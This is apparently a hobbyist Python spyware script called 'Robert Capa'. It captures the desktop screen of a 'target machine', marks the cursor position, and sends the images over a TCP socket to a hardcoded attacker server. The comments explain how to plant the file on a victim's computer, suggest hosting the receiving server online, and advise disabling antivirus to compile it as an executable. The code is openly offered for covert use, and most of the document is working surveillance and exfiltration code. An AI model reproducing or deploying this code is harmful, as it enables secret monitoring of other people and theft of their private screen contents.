# Robert Capa going to be as close as he can to your target to take a photo
# Occasionally he's going to step on a mine and explode not before of course recording everything.
# Spy a desktop screen in your local net taking screen prints and sending to a server in your local machine
# If you wish, you can host the server on the Internet using hosting services such as Hostigator
# To execute this you need to start the server on your local machine, get the host ip and put then as the
# value of the host var on Robert Capa.py, doing this, put the file on your target machine and execute it.
# If everything works, you will get a screen print every 3 seconds from Robert named as 1,2,3 respectively
# To run the python file: pip install pyautogui pillow ; Compiling to exe you need disable the antivirus
import os
import socket
from pyautogui import screenshot, position
from os.path import getsize
from os import mkdir, chdir
from shutil import rmtree
from time import sleep
from PIL import ImageDraw, Image
import io
import base64


try:
    mkdir('Images')
except OSError:
    rmtree('Images')
    mkdir('Images')
chdir('Images')

port = 7562
buffer = 16384

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setblocking(True)
    try:  # If you can, remove this try section putting the serer ipv4 address as str
        print('#1 connecting <192.168.1.4>')
        s.connect(('192.168.1.4', port))
    except:
        print('Failed to connect, trying another address...')
        try:
            print('#2 connecting <194.168.1.5>')
            s.connect(('194.168.1.5', port))
        except:
            print('Error, can\'t connect with host. Ip not found or server are offline')
            sleep(5)
            quit(1)
    n = 0
    print('Connected successfully! Sending images now...')

    n += 1
    filename = f'{n}.png'
    s.sendall(filename.encode())  # Send all bytes of filename str
    x, y = position()  # Get cursor position
    im = screenshot()  # Take a print
    draw = ImageDraw.Draw(im)  # Set a Draw object
    draw.ellipse((x, y, x+20, y+20), fill=(255, 0, 0), outline=(0, 0, 0))  # Draw the cursor as ellipse
    im.save(filename)
    bytes_file = open(filename, 'rb').read()
    filesize = f'{len(bytes_file)}'.encode()
    s.sendall(filesize)  # Send im size
    print(f'Sending: {filename} Size: {int(int(filesize) / 1024)}Kb')
    s.sendall(bytes_file)  # Send image
